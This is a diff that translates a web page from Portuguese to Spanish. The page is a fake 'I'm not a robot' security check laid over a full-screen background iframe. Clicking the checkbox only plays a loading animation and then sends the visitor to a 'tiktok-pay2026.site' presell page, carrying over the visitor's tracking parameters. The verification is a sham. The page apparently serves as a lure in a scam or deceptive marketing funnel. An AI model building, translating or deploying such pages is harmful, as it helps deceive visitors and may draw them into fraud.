@@ -1,13 +1,13 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="es">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verificacao de Seguranca</title>
+  <title>Verificación de Seguridad</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
 
-    /* Iframe configurado para ficar em tela cheia no fundo */
+    /* Iframe configurado para pantalla completa de fondo */
     .bg-iframe {
       position: fixed;
       top: 0;
@@ -19,7 +19,7 @@
     }
 
     body {
-      background: transparent; /* Fundo transparente para o iframe aparecer */
+      background: transparent; /* Fondo transparente para que aparezca el iframe */
       min-height: 100vh;
       display: flex;
       align-items: center;
@@ -35,7 +35,7 @@
       gap: 24px;
       width: 100%;
       max-width: 340px;
-      z-index: 1; /* Garante que o botão fique na frente */
+      z-index: 1; /* Garantiza que el botón se mantenga al frente */
     }
 
     .check-row {
@@ -48,7 +48,7 @@
       cursor: pointer;
       background: #fff;
       width: 100%;
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2); /* Sombra para destacar o botão do fundo */
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2); /* Sombra para resaltar el botón del fondo */
       -webkit-tap-highlight-color: transparent;
     }
 
@@ -114,7 +114,7 @@
   <div class="box">
     <div class="check-row" id="row" onclick="verify()">
       <div class="checkbox" id="cb"></div>
-      <span class="label">N&#227;o sou um rob&#244;</span>
+      <span class="label">No soy un robot</span>
     </div>
     <span class="status" id="status"></span>
   </div>
@@ -134,21 +134,21 @@
       setTimeout(function() {
         cb.classList.remove('loading');
         cb.classList.add('checked');
-        st.textContent = 'Verificado! Redirecionando...';
+        st.textContent = '¡Verificado! Redireccionando...';
         
         setTimeout(function() {
-          // Cria um objeto URL com o seu link de destino original
+          // Crea un objeto URL con tu enlace de destino original
           const urlDestino = new URL('https://tiktok-pay2026.site/presell/');
           
-          // Pega todos os parâmetros (UTMs) da página atual em que o usuário está
-          const parametrosAtuais = new URLSearchParams(window.location.search);
+          // Obtiene todos los parámetros (UTMs) de la página actual en la que está el usuario
+          const parametrosActuales = new URLSearchParams(window.location.search);
           
-          // Adiciona cada UTM/parâmetro da página atual no link de destino
-          parametrosAtuais.forEach((valor, chave) => {
-            urlDestino.searchParams.set(chave, valor);
+          // Añade cada UTM/parámetro de la página actual al enlace de destino
+          parametrosActuales.forEach((valor, clave) => {
+            urlDestino.searchParams.set(clave, valor);
           });
           
-          // Redireciona o usuário para o link final com as UTMs preservadas
+          // Redirecciona al usuario al enlace final con las UTMs preservadas
           window.location.href = urlDestino.toString();
         }, 1500);
       }, 2000);
